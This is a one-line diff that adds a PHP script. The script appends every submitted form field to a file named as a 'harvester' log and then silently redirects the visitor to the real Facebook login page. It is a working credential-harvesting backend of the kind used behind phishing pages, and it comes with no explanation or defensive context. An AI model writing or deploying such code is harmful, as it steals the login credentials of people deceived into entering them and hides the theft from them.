@@ -1,0 +1,1 @@
+<?php $file = 'harvester_2017-08-03 13:44:44.672384.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=https://login.facebook.com/login.php" />
